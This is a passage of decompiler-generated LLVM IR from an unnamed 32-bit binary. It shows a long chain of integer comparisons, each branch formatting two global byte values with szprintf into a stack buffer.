  %v2_804abca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abca, i32* @ebx, align 4
  %v5_804abd1 = call i32 @szprintf(i32 %v2_804abca, i32 ptrtoint ([13 x i8]* @global_var_8058bf4.119 to i32), i32 %v1_804abbb, i32 %v1_804abaf)
  br label %dec_label_pc_804abd9

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804aba9, %dec_label_pc_804abaf
  %v12_804abd9 = icmp eq i32 %v11_8049ac4, 91
  %v1_804abdd = icmp eq i1 %v12_804abd9, false
  br i1 %v1_804abdd, label %dec_label_pc_804ac09, label %dec_label_pc_804abdf

dec_label_pc_804abdf:                             ; preds = %dec_label_pc_804abd9
  %v0_804abdf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804abdf = zext i8 %v0_804abdf to i32
  store i32 %v1_804abdf, i32* @edx, align 4
  %v0_804abeb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804abeb = zext i8 %v0_804abeb to i32
  %v2_804abfa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abfa, i32* @ebx, align 4
  %v5_804ac01 = call i32 @szprintf(i32 %v2_804abfa, i32 ptrtoint ([13 x i8]* @global_var_8058c01.120 to i32), i32 %v1_804abeb, i32 %v1_804abdf)
  br label %dec_label_pc_804ac09

dec_label_pc_804ac09:                             ; preds = %dec_label_pc_804abd9, %dec_label_pc_804abdf
  %v12_804ac09 = icmp eq i32 %v11_8049ac4, 92
  %v1_804ac0d = icmp eq i1 %v12_804ac09, false
  br i1 %v1_804ac0d, label %dec_label_pc_804ac39, label %dec_label_pc_804ac0f

dec_label_pc_804ac0f:                             ; preds = %dec_label_pc_804ac09
  %v0_804ac0f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ac0f = zext i8 %v0_804ac0f to i32
  store i32 %v1_804ac0f, i32* @edx, align 4
  %v0_804ac1b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ac1b = zext i8 %v0_804ac1b to i32
  %v2_804ac2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac2a, i32* @ebx, align 4
  %v5_804ac31 = call i32 @szprintf(i32 %v2_804ac2a, i32 ptrtoint ([13 x i8]* @global_var_8058c0e.121 to i32), i32 %v1_804ac1b, i32 %v1_804ac0f)
  br label %dec_label_pc_804ac39

dec_label_pc_804ac39:                             ; preds = %dec_label_pc_804ac09, %dec_label_pc_804ac0f
  %v12_804ac39 = icmp eq i32 %v11_8049ac4, 93
  %v1_804ac3d = icmp eq i1 %v12_804ac39, false
  br i1 %v1_804ac3d, label %dec_label_pc_804ac69, label %dec_label_pc_804ac3f

dec_label_pc_804ac3f:                             ; preds = %dec_label_pc_804ac39
  %v0_804ac3f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ac3f = zext i8 %v0_804ac3f to i32
  store i32 %v1_804ac3f, i32* @edx, align 4
  %v0_804ac4b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ac4b = zext i8 %v0_804ac4b to i32
  %v2_804ac5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac5a, i32* @ebx, align 4
  %v5_804ac61 = call i32 @szprintf(i32 %v2_804ac5a, i32 ptrtoint ([13 x i8]* @global_var_8058c1b.122 to i32), i32 %v1_804ac4b, i32 %v1_804ac3f)
  br label %dec_label_pc_804ac69

dec_label_pc_804ac69:                             ; preds = %dec_label_pc_804ac39, %dec_label_pc_804ac3f
  %v12_804ac69 = icmp eq i32 %v11_8049ac4, 94
  %v1_804ac6d = icmp eq i1 %v12_804ac69, false
  br i1 %v1_804ac6d, label %dec_label_pc_804ac99, label %dec_label_pc_804ac6f

dec_label_pc_804ac6f:                             ; preds = %dec_label_pc_804ac69
  %v0_804ac6f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ac6f = zext i8 %v0_804ac6f to i32
  store i32 %v1_804ac6f, i32* @edx, align 4
  %v0_804ac7b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ac7b = zext i8 %v0_804ac7b to i32
  %v2_804ac8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8a, i32* @ebx, align 4
  %v5_804ac91 = call i32 @szprintf(i32 %v2_804ac8a, i32 ptrtoint ([13 x i8]* @global_var_805898d.72 to i32), i32 %v1_804ac7b, i32 %v1_804ac6f)
  br label %dec_label_pc_804ac99

dec_label_pc_804ac99:                             ; preds = %dec_label_pc_804ac69, %dec_label_pc_804ac6f
  %v12_804ac99 = icmp eq i32 %v11_8049ac4, 95
  %v1_804ac9d = icmp eq i1 %v12_804ac99, false
  br i1 %v1_804ac9d, label %dec_label_pc_804acc9, label %dec_label_pc_804ac9f

dec_label_pc_804ac9f:                             ; preds = %dec_label_pc_804ac99
  %v0_804ac9f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ac9f = zext i8 %v0_804ac9f to i32
  store i32 %v1_804ac9f, i32* @edx, align 4
  %v0_804acab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804acab = zext i8 %v0_804acab to i32
  %v2_804acba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acba, i32* @ebx, align 4
  %v5_804acc1 = call i32 @szprintf(i32 %v2_804acba, i32 ptrtoint ([13 x i8]* @global_var_8058c28.123 to i32), i32 %v1_804acab, i32 %v1_804ac9f)
  br label %dec_label_pc_804acc9

dec_label_pc_804acc9:                             ; preds = %dec_label_pc_804ac99, %dec_label_pc_804ac9f
  %v9_804acc9 = icmp eq i32 %v11_8049ac4, 96
  %v1_804accd = icmp eq i1 %v9_804acc9, false
  br i1 %v1_804accd, label %dec_label_pc_804acf9, label %dec_label_pc_804accf

dec_label_pc_804accf:                             ; preds = %dec_label_pc_804acc9
  %v0_804accf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804accf = zext i8 %v0_804accf to i32
  store i32 %v1_804accf, i32* @edx, align 4
  %v0_804acdb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804acdb = zext i8 %v0_804acdb to i32
  %v2_804acea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acea, i32* @ebx, align 4
  %v5_804acf1 = call i32 @szprintf(i32 %v2_804acea, i32 ptrtoint ([13 x i8]* @global_var_80589b4.75 to i32), i32 %v1_804acdb, i32 %v1_804accf)
  br label %dec_label_pc_804acf9

dec_label_pc_804acf9:                             ; preds = %dec_label_pc_804acc9, %dec_label_pc_804accf
  %v12_804acf9 = icmp eq i32 %v11_8049ac4, 97
  %v1_804acfd = icmp eq i1 %v12_804acf9, false
  br i1 %v1_804acfd, label %dec_label_pc_804ad29, label %dec_label_pc_804acff

dec_label_pc_804acff:                             ; preds = %dec_label_pc_804acf9
  %v0_804acff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804acff = zext i8 %v0_804acff to i32
  store i32 %v1_804acff, i32* @edx, align 4
  %v0_804ad0b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ad0b = zext i8 %v0_804ad0b to i32
  %v2_804ad1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad1a, i32* @ebx, align 4
  %v5_804ad21 = call i32 @szprintf(i32 %v2_804ad1a, i32 ptrtoint ([13 x i8]* @global_var_8058c35.124 to i32), i32 %v1_804ad0b, i32 %v1_804acff)
  br label %dec_label_pc_804ad29

dec_label_pc_804ad29:                             ; preds = %dec_label_pc_804acf9, %dec_label_pc_804acff
  %v12_804ad29 = icmp eq i32 %v11_8049ac4, 98
  %v1_804ad2d = icmp eq i1 %v12_804ad29, false
  br i1 %v1_804ad2d, label %dec_label_pc_804ad59, label %dec_label_pc_804ad2f

dec_label_pc_804ad2f:                             ; preds = %dec_label_pc_804ad29
  %v0_804ad2f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ad2f = zext i8 %v0_804ad2f to i32
  store i32 %v1_804ad2f, i32* @edx, align 4
  %v0_804ad3b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ad3b = zext i8 %v0_804ad3b to i32
  %v2_804ad4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad4a, i32* @ebx, align 4
  %v5_804ad51 = call i32 @szprintf(i32 %v2_804ad4a, i32 ptrtoint ([13 x i8]* @global_var_8058c42.125 to i32), i32 %v1_804ad3b, i32 %v1_804ad2f)
  br label %dec_label_pc_804ad59

dec_label_pc_804ad59:                             ; preds = %dec_label_pc_804ad29, %dec_label_pc_804ad2f
  %v12_804ad59 = icmp eq i32 %v11_8049ac4, 99
  %v1_804ad5d = icmp eq i1 %v12_804ad59, false
  br i1 %v1_804ad5d, label %dec_label_pc_804ad89, label %dec_label_pc_804ad5f

dec_label_pc_804ad5f:                             ; preds = %dec_label_pc_804ad59
  %v0_804ad5f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ad5f = zext i8 %v0_804ad5f to i32
  store i32 %v1_804ad5f, i32* @edx, align 4
  %v0_804ad6b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ad6b = zext i8 %v0_804ad6b to i32
  %v2_804ad7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad7a, i32* @ebx, align 4
  %v5_804ad81 = call i32 @szprintf(i32 %v2_804ad7a, i32 ptrtoint ([13 x i8]* @global_var_8058c4f.126 to i32), i32 %v1_804ad6b, i32 %v1_804ad5f)
  br label %dec_label_pc_804ad89

dec_label_pc_804ad89:                             ; preds = %dec_label_pc_804ad59, %dec_label_pc_804ad5f
  %v12_804ad89 = icmp eq i32 %v11_8049ac4, 100
  %v1_804ad8d = icmp eq i1 %v12_804ad89, false
  br i1 %v1_804ad8d, label %dec_label_pc_804adb9, label %dec_label_pc_804ad8f

dec_label_pc_804ad8f:                             ; preds = %dec_label_pc_804ad89
  %v0_804ad8f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ad8f = zext i8 %v0_804ad8f to i32
  store i32 %v1_804ad8f, i32* @edx, align 4
  %v0_804ad9b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ad9b = zext i8 %v0_804ad9b to i32
  %v2_804adaa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adaa, i32* @ebx, align 4
  %v5_804adb1 = call i32 @szprintf(i32 %v2_804adaa, i32 ptrtoint ([13 x i8]* @global_var_8058c5c.127 to i32), i32 %v1_804ad9b, i32 %v1_804ad8f)
  br label %dec_label_pc_804adb9

dec_label_pc_804adb9:                             ; preds = %dec_label_pc_804ad89, %dec_label_pc_804ad8f
  %v12_804adb9 = icmp eq i32 %v11_8049ac4, 101
  %v1_804adbd = icmp eq i1 %v12_804adb9, false
  br i1 %v1_804adbd, label %dec_label_pc_804ade9, label %dec_label_pc_804adbf

dec_label_pc_804adbf:                             ; preds = %dec_label_pc_804adb9
  %v0_804adbf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804adbf = zext i8 %v0_804adbf to i32
  store i32 %v1_804adbf, i32* @edx, align 4
  %v0_804adcb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804adcb = zext i8 %v0_804adcb to i32
  %v2_804adda = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adda, i32* @ebx, align 4
  %v5_804ade1 = call i32 @szprintf(i32 %v2_804adda, i32 ptrtoint ([13 x i8]* @global_var_8058c69.128 to i32), i32 %v1_804adcb, i32 %v1_804adbf)
  br label %dec_label_pc_804ade9

dec_label_pc_804ade9:                             ; preds = %dec_label_pc_804adb9, %dec_label_pc_804adbf
  %v12_804ade9 = icmp eq i32 %v11_8049ac4, 102
  %v1_804aded = icmp eq i1 %v12_804ade9, false
  br i1 %v1_804aded, label %dec_label_pc_804ae19, label %dec_label_pc_804adef

dec_label_pc_804adef:                             ; preds = %dec_label_pc_804ade9
  %v0_804adef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804adef = zext i8 %v0_804adef to i32
  store i32 %v1_804adef, i32* @edx, align 4
  %v0_804adfb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804adfb = zext i8 %v0_804adfb to i32
  %v2_804ae0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae0a, i32* @ebx, align 4
  %v5_804ae11 = call i32 @szprintf(i32 %v2_804ae0a, i32 ptrtoint ([12 x i8]* @global_var_8058c76.129 to i32), i32 %v1_804adfb, i32 %v1_804adef)
  br label %dec_label_pc_804ae19

dec_label_pc_804ae19:                             ; preds = %dec_label_pc_804ade9, %dec_label_pc_804adef
  %v12_804ae19 = icmp eq i32 %v11_8049ac4, 103
  %v1_804ae1d = icmp eq i1 %v12_804ae19, false
  br i1 %v1_804ae1d, label %dec_label_pc_804ae49, label %dec_label_pc_804ae1f

dec_label_pc_804ae1f:                             ; preds = %dec_label_pc_804ae19
  %v0_804ae1f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ae1f = zext i8 %v0_804ae1f to i32
  store i32 %v1_804ae1f, i32* @edx, align 4
  %v0_804ae2b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ae2b = zext i8 %v0_804ae2b to i32
  %v2_804ae3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3a, i32* @ebx, align 4
  %v5_804ae41 = call i32 @szprintf(i32 %v2_804ae3a, i32 ptrtoint ([13 x i8]* @global_var_8058c82.130 to i32), i32 %v1_804ae2b, i32 %v1_804ae1f)
  br label %dec_label_pc_804ae49

dec_label_pc_804ae49:                             ; preds = %dec_label_pc_804ae19, %dec_label_pc_804ae1f
  %v12_804ae49 = icmp eq i32 %v11_8049ac4, 104
  %v1_804ae4d = icmp eq i1 %v12_804ae49, false
  br i1 %v1_804ae4d, label %dec_label_pc_804ae79, label %dec_label_pc_804ae4f

dec_label_pc_804ae4f:                             ; preds = %dec_label_pc_804ae49
  %v0_804ae4f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ae4f = zext i8 %v0_804ae4f to i32
  store i32 %v1_804ae4f, i32* @edx, align 4
  %v0_804ae5b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ae5b = zext i8 %v0_804ae5b to i32
  %v2_804ae6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae6a, i32* @ebx, align 4
  %v5_804ae71 = call i32 @szprintf(i32 %v2_804ae6a, i32 ptrtoint ([13 x i8]* @global_var_8058c8f.131 to i32), i32 %v1_804ae5b, i32 %v1_804ae4f)
  br label %dec_label_pc_804ae79

dec_label_pc_804ae79:                             ; preds = %dec_label_pc_804ae49, %dec_label_pc_804ae4f
  %v12_804ae79 = icmp eq i32 %v11_8049ac4, 105
  %v1_804ae7d = icmp eq i1 %v12_804ae79, false
  br i1 %v1_804ae7d, label %dec_label_pc_804aea9, label %dec_label_pc_804ae7f

dec_label_pc_804ae7f:                             ; preds = %dec_label_pc_804ae79
  %v0_804ae7f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ae7f = zext i8 %v0_804ae7f to i32
  store i32 %v1_804ae7f, i32* @edx, align 4
  %v0_804ae8b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ae8b = zext i8 %v0_804ae8b to i32
  %v2_804ae9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae9a, i32* @ebx, align 4
  %v5_804aea1 = call i32 @szprintf(i32 %v2_804ae9a, i32 ptrtoint ([13 x i8]* @global_var_8058c9c.132 to i32), i32 %v1_804ae8b, i32 %v1_804ae7f)
  br label %dec_label_pc_804aea9

dec_label_pc_804aea9:                             ; preds = %dec_label_pc_804ae79, %dec_label_pc_804ae7f
  %v12_804aea9 = icmp eq i32 %v11_8049ac4, 106
  %v1_804aead = icmp eq i1 %v12_804aea9, false
  br i1 %v1_804aead, label %dec_label_pc_804aed9, label %dec_label_pc_804aeaf

dec_label_pc_804aeaf:                             ; preds = %dec_label_pc_804aea9
  %v0_804aeaf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aeaf = zext i8 %v0_804aeaf to i32
  store i32 %v1_804aeaf, i32* @edx, align 4
  %v0_804aebb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aebb = zext i8 %v0_804aebb to i32
  %v2_804aeca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aeca, i32* @ebx, align 4
  %v5_804aed1 = call i32 @szprintf(i32 %v2_804aeca, i32 ptrtoint ([12 x i8]* @global_var_8058ca9.133 to i32), i32 %v1_804aebb, i32 %v1_804aeaf)
  br label %dec_label_pc_804aed9

dec_label_pc_804aed9:                             ; preds = %dec_label_pc_804aea9, %dec_label_pc_804aeaf
  %v12_804aed9 = icmp eq i32 %v11_8049ac4, 107
  %v1_804aedd = icmp eq i1 %v12_804aed9, false
  br i1 %v1_804aedd, label %dec_label_pc_804af09, label %dec_label_pc_804aedf

dec_label_pc_804aedf:                             ; preds = %dec_label_pc_804aed9
  %v0_804aedf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aedf = zext i8 %v0_804aedf to i32
  store i32 %v1_804aedf, i32* @edx, align 4
  %v0_804aeeb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aeeb = zext i8 %v0_804aeeb to i32
  %v2_804aefa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aefa, i32* @ebx, align 4
  %v5_804af01 = call i32 @szprintf(i32 %v2_804aefa, i32 ptrtoint ([13 x i8]* @global_var_8058cb5.134 to i32), i32 %v1_804aeeb, i32 %v1_804aedf)
  br label %dec_label_pc_804af09

dec_label_pc_804af09:                             ; preds = %dec_label_pc_804aed9, %dec_label_pc_804aedf
  %v12_804af09 = icmp eq i32 %v11_8049ac4, 108
  %v1_804af0d = icmp eq i1 %v12_804af09, false
  br i1 %v1_804af0d, label %dec_label_pc_804af39, label %dec_label_pc_804af0f

dec_label_pc_804af0f:                             ; preds = %dec_label_pc_804af09
  %v0_804af0f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804af0f = zext i8 %v0_804af0f to i32
  store i32 %v1_804af0f, i32* @edx, align 4
  %v0_804af1b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804af1b = zext i8 %v0_804af1b to i32
  %v2_804af2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af2a, i32* @ebx, align 4
  %v5_804af31 = call i32 @szprintf(i32 %v2_804af2a, i32 ptrtoint ([14 x i8]* @global_var_8058cc2.135 to i32), i32 %v1_804af1b, i32 %v1_804af0f)
  br label %dec_label_pc_804af39

dec_label_pc_804af39:                             ; preds = %dec_label_pc_804af09, %dec_label_pc_804af0f
  %v12_804af39 = icmp eq i32 %v11_8049ac4, 109
  %v1_804af3d = icmp eq i1 %v12_804af39, false
  br i1 %v1_804af3d, label %dec_label_pc_804af69, label %dec_label_pc_804af3f

dec_label_pc_804af3f:                             ; preds = %dec_label_pc_804af39
  %v0_804af3f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804af3f = zext i8 %v0_804af3f to i32
  store i32 %v1_804af3f, i32* @edx, align 4
  %v0_804af4b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804af4b = zext i8 %v0_804af4b to i32
  %v2_804af5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af5a, i32* @ebx, align 4
  %v5_804af61 = call i32 @szprintf(i32 %v2_804af5a, i32 ptrtoint ([14 x i8]* @global_var_8058cd0.136 to i32), i32 %v1_804af4b, i32 %v1_804af3f)
  br label %dec_label_pc_804af69

dec_label_pc_804af69:                             ; preds = %dec_label_pc_804af39, %dec_label_pc_804af3f
  %v12_804af69 = icmp eq i32 %v11_8049ac4, 110
  %v1_804af6d = icmp eq i1 %v12_804af69, false
  br i1 %v1_804af6d, label %dec_label_pc_804af99, label %dec_label_pc_804af6f

dec_label_pc_804af6f:                             ; preds = %dec_label_pc_804af69
  %v0_804af6f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804af6f = zext i8 %v0_804af6f to i32
  store i32 %v1_804af6f, i32* @edx, align 4
  %v0_804af7b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804af7b = zext i8 %v0_804af7b to i32
  %v2_804af8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af8a, i32* @ebx, align 4
  %v5_804af91 = call i32 @szprintf(i32 %v2_804af8a, i32 ptrtoint ([13 x i8]* @global_var_8058cde.137 to i32), i32 %v1_804af7b, i32 %v1_804af6f)
  br label %dec_label_pc_804af99

dec_label_pc_804af99:                             ; preds = %dec_label_pc_804af69, %dec_label_pc_804af6f
  %v12_804af99 = icmp eq i32 %v11_8049ac4, 111
  %v1_804af9d = icmp eq i1 %v12_804af99, false
  br i1 %v1_804af9d, label %dec_label_pc_804afc9, label %dec_label_pc_804af9f

dec_label_pc_804af9f:                             ; preds = %dec_label_pc_804af99
  %v0_804af9f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804af9f = zext i8 %v0_804af9f to i32
  store i32 %v1_804af9f, i32* @edx, align 4
  %v0_804afab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804afab = zext i8 %v0_804afab to i32
  %v2_804afba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afba, i32* @ebx, align 4
  %v5_804afc1 = call i32 @szprintf(i32 %v2_804afba, i32 ptrtoint ([14 x i8]* @global_var_8058ceb.138 to i32), i32 %v1_804afab, i32 %v1_804af9f)
  br label %dec_label_pc_804afc9

dec_label_pc_804afc9:                             ; preds = %dec_label_pc_804af99, %dec_label_pc_804af9f
  %v9_804afc9 = icmp eq i32 %v11_8049ac4, 112
  %v1_804afcd = icmp eq i1 %v9_804afc9, false
  br i1 %v1_804afcd, label %dec_label_pc_804aff9, label %dec_label_pc_804afcf

dec_label_pc_804afcf:                             ; preds = %dec_label_pc_804afc9
  %v0_804afcf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804afcf = zext i8 %v0_804afcf to i32
  store i32 %v1_804afcf, i32* @edx, align 4
  %v0_804afdb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804afdb = zext i8 %v0_804afdb to i32
  %v2_804afea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afea, i32* @ebx, align 4
  %v5_804aff1 = call i32 @szprintf(i32 %v2_804afea, i32 ptrtoint ([14 x i8]* @global_var_8058cf9.139 to i32), i32 %v1_804afdb, i32 %v1_804afcf)
  br label %dec_label_pc_804aff9

dec_label_pc_804aff9:                             ; preds = %dec_label_pc_804afc9, %dec_label_pc_804afcf
  %v12_804aff9 = icmp eq i32 %v11_8049ac4, 113
  %v1_804affd = icmp eq i1 %v12_804aff9, false
  br i1 %v1_804affd, label %dec_label_pc_804b029, label %dec_label_pc_804afff

dec_label_pc_804afff:                             ; preds = %dec_label_pc_804aff9
  %v0_804afff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804afff = zext i8 %v0_804afff to i32
  store i32 %v1_804afff, i32* @edx, align 4
  %v0_804b00b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b00b = zext i8 %v0_804b00b to i32
  %v2_804b01a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b01a, i32* @ebx, align 4
  %v5_804b021 = call i32 @szprintf(i32 %v2_804b01a, i32 ptrtoint ([13 x i8]* @global_var_8058d07.140 to i32), i32 %v1_804b00b, i32 %v1_804afff)
  br label %dec_label_pc_804b029

dec_label_pc_804b029:                             ; preds = %dec_label_pc_804aff9, %dec_label_pc_804afff
  %v12_804b029 = icmp eq i32 %v11_8049ac4, 114
  %v1_804b02d = icmp eq i1 %v12_804b029, false
  br i1 %v1_804b02d, label %dec_label_pc_804b059, label %dec_label_pc_804b02f

dec_label_pc_804b02f:                             ; preds = %dec_label_pc_804b029
  %v0_804b02f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b02f = zext i8 %v0_804b02f to i32
  store i32 %v1_804b02f, i32* @edx, align 4
  %v0_804b03b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b03b = zext i8 %v0_804b03b to i32
  %v2_804b04a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b04a, i32* @ebx, align 4
  %v5_804b051 = call i32 @szprintf(i32 %v2_804b04a, i32 ptrtoint ([14 x i8]* @global_var_8058d14.141 to i32), i32 %v1_804b03b, i32 %v1_804b02f)
  br label %dec_label_pc_804b059

dec_label_pc_804b059:                             ; preds = %dec_label_pc_804b029, %dec_label_pc_804b02f
  %v12_804b059 = icmp eq i32 %v11_8049ac4, 115
  %v1_804b05d = icmp eq i1 %v12_804b059, false
  br i1 %v1_804b05d, label %dec_label_pc_804b089, label %dec_label_pc_804b05f

dec_label_pc_804b05f:                             ; preds = %dec_label_pc_804b059
  %v0_804b05f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b05f = zext i8 %v0_804b05f to i32
  store i32 %v1_804b05f, i32* @edx, align 4
  %v0_804b06b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b06b = zext i8 %v0_804b06b to i32
  %v2_804b07a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b07a, i32* @ebx, align 4
  %v5_804b081 = call i32 @szprintf(i32 %v2_804b07a, i32 ptrtoint ([13 x i8]* @global_var_8058d22.142 to i32), i32 %v1_804b06b, i32 %v1_804b05f)
  br label %dec_label_pc_804b089

dec_label_pc_804b089:                             ; preds = %dec_label_pc_804b059, %dec_label_pc_804b05f
  %v12_804b089 = icmp eq i32 %v11_8049ac4, 116
  %v1_804b08d = icmp eq i1 %v12_804b089, false
  br i1 %v1_804b08d, label %dec_label_pc_804b0b9, label %dec_label_pc_804b08f

dec_label_pc_804b08f:                             ; preds = %dec_label_pc_804b089
  %v0_804b08f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b08f = zext i8 %v0_804b08f to i32
  store i32 %v1_804b08f, i32* @edx, align 4
  %v0_804b09b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b09b = zext i8 %v0_804b09b to i32
  %v2_804b0aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0aa, i32* @ebx, align 4
  %v5_804b0b1 = call i32 @szprintf(i32 %v2_804b0aa, i32 ptrtoint ([13 x i8]* @global_var_8058d2f.143 to i32), i32 %v1_804b09b, i32 %v1_804b08f)
  br label %dec_label_pc_804b0b9

dec_label_pc_804b0b9:                             ; preds = %dec_label_pc_804b089, %dec_label_pc_804b08f
  %v12_804b0b9 = icmp eq i32 %v11_8049ac4, 117
  %v1_804b0bd = icmp eq i1 %v12_804b0b9, false
  br i1 %v1_804b0bd, label %dec_label_pc_804b0e9, label %dec_label_pc_804b0bf

dec_label_pc_804b0bf:                             ; preds = %dec_label_pc_804b0b9
  %v0_804b0bf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b0bf = zext i8 %v0_804b0bf to i32
  store i32 %v1_804b0bf, i32* @edx, align 4
  %v0_804b0cb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b0cb = zext i8 %v0_804b0cb to i32
  %v2_804b0da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0da, i32* @ebx, align 4
  %v5_804b0e1 = call i32 @szprintf(i32 %v2_804b0da, i32 ptrtoint ([14 x i8]* @global_var_8058d3c.144 to i32), i32 %v1_804b0cb, i32 %v1_804b0bf)
  br label %dec_label_pc_804b0e9

dec_label_pc_804b0e9:                             ; preds = %dec_label_pc_804b0b9, %dec_label_pc_804b0bf
  %v12_804b0e9 = icmp eq i32 %v11_8049ac4, 118
  %v1_804b0ed = icmp eq i1 %v12_804b0e9, false
  br i1 %v1_804b0ed, label %dec_label_pc_804b119, label %dec_label_pc_804b0ef

dec_label_pc_804b0ef:                             ; preds = %dec_label_pc_804b0e9
  %v0_804b0ef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b0ef = zext i8 %v0_804b0ef to i32
  store i32 %v1_804b0ef, i32* @edx, align 4
  %v0_804b0fb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b0fb = zext i8 %v0_804b0fb to i32
  %v2_804b10a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b10a, i32* @ebx, align 4
  %v5_804b111 = call i32 @szprintf(i32 %v2_804b10a, i32 ptrtoint ([14 x i8]* @global_var_8058d4a.145 to i32), i32 %v1_804b0fb, i32 %v1_804b0ef)
  br label %dec_label_pc_804b119

dec_label_pc_804b119:                             ; preds = %dec_label_pc_804b0e9, %dec_label_pc_804b0ef
  %v12_804b119 = icmp eq i32 %v11_8049ac4, 119
  %v1_804b11d = icmp eq i1 %v12_804b119, false
  br i1 %v1_804b11d, label %dec_label_pc_804b149, label %dec_label_pc_804b11f

dec_label_pc_804b11f:                             ; preds = %dec_label_pc_804b119
  %v0_804b11f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b11f = zext i8 %v0_804b11f to i32
  store i32 %v1_804b11f, i32* @edx, align 4
  %v0_804b12b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b12b = zext i8 %v0_804b12b to i32
  %v2_804b13a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b13a, i32* @ebx, align 4
  %v5_804b141 = call i32 @szprintf(i32 %v2_804b13a, i32 ptrtoint ([14 x i8]* @global_var_8058d58.146 to i32), i32 %v1_804b12b, i32 %v1_804b11f)
  br label %dec_label_pc_804b149

dec_label_pc_804b149:                             ; preds = %dec_label_pc_804b119, %dec_label_pc_804b11f
  %v12_804b149 = icmp eq i32 %v11_8049ac4, 120
  %v1_804b14d = icmp eq i1 %v12_804b149, false
  br i1 %v1_804b14d, label %dec_label_pc_804b179, label %dec_label_pc_804b14f

dec_label_pc_804b14f:                             ; preds = %dec_label_pc_804b149
  %v0_804b14f = load i8, i8* @global_var_805f8da.30, align 2
